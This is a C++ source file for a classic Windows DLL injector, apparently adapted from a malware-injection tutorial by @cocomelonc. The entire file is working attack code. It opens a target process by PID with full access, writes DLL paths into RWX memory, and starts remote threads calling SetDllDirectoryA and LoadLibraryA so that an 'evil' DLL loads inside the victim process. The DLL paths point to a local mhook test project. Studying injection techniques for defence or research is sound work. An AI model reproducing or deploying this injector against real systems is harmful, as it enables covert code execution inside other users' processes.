/*
* evil_inj.cpp
* classic DLL injection example
* author: @cocomelonc
* https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#ifdef _DEBUG
char evilDLLPath[] = "D:\\FromE\\Daniel\\VC++\\MIPTest\\mhook-dll-test\\x64\\Debug\\";
#elif NDEBUG
char evilDLLPath[] = "D:\\FromE\\Daniel\\VC++\\MIPTest\\mhook-dll-test\\x64\\Release\\";
#endif
unsigned int evilLenPath = sizeof(evilDLLPath) + 1;
#ifdef _DEBUG
char evilDLL[] = "D:\\FromE\\Daniel\\VC++\\MIPTest\\mhook-dll-test\\x64\\Debug\\mhook-dll-test.dll";
#elif NDEBUG
char evilDLL[] = "D:\\FromE\\Daniel\\VC++\\MIPTest\\mhook-dll-test\\x64\\Release\\mhook-dll-test.dll";
#endif
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    LPVOID rb; // remote buffer

    // handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
    VOID* sdd = GetProcAddress(hKernel32, "SetDllDirectoryA");

    // parse process ID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLenPath, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" evil DLL between processes
    WriteProcessMemory(ph, rb, evilDLLPath, evilLenPath, NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)sdd, rb, 0, NULL);

    //////////////////////////////////////////////////////

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" evil DLL between processes
    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    CloseHandle(ph);
    return 0;
}
